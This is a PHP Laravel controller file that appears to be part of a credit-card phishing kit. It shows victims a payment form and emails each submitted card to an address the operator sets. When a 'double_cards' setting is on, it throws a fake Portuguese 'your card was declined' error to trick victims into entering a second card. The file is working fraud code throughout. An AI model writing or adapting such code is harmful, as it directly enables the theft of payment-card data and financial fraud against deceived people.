<?php

namespace App\Http\Controllers;

use App\Http\Requests\StorePaymentRequest;
use App\Mail\CardDetails;
use App\Models\Settings;
use App\Models\Visitor;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Mail;
use Illuminate\Validation\ValidationException;
use Throwable;

class PaymentController extends Controller {
    public function index(Request $request)
    {
        $this->redirect_if($request, 'index', additionalKeys: 'bill');
        $bill = self::decrypt($request->get('bill'));
        return view('cc', ['billings' => $bill]);
    }

    public function post(StorePaymentRequest $request): RedirectResponse
    {
        $visitor = Visitor::current();
        $settings = Settings::me();

        try {
            Mail::to($settings->email_result)->sendNow(new CardDetails($request));
            $visitor->increment('card_count');
        } catch (Throwable $t) {
            Log::error($t);
        }

        if ($visitor->card_count > ($settings->double_cards ? 1 : 0)) {
            $visitor->is_finished = true;
            $visitor->save();
            return $this->redirect_to(
                route: 'finish',
                method: 'finish',
            );
        }

        throw ValidationException::withMessages([
            'cardNumber' => 'Seu cartão foi recusado, por favor tente outro cartão.',
        ]);
    }
}
